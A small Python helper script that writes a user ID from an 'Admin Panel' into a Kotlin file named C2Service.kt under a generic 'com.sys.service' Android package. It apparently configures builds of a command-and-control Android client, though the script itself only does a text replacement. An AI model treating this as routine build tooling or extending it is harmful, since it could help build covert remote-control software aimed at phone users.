import argparse
import os

def inject_user_id(file_path, user_id):
    if not os.path.exists(file_path):
        print(f"[-] File not found: {file_path}")
        return
        
    with open(file_path, 'r') as f:
        content = f.read()
    
    # Replace the placeholder
    content = content.replace('private val USER_ID = "YOUR_USER_ID"', f'private val USER_ID = "{user_id}"')
    
    with open(file_path, 'w') as f:
        f.write(content)
        
    print(f"[+] Injected USER_ID: {user_id}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--user_id', required=True, help="User ID from Admin Panel")
    args = parser.parse_args()

    kotlin_file = "android_base/app/src/main/java/com/sys/service/C2Service.kt"
    inject_user_id(kotlin_file, args.user_id)
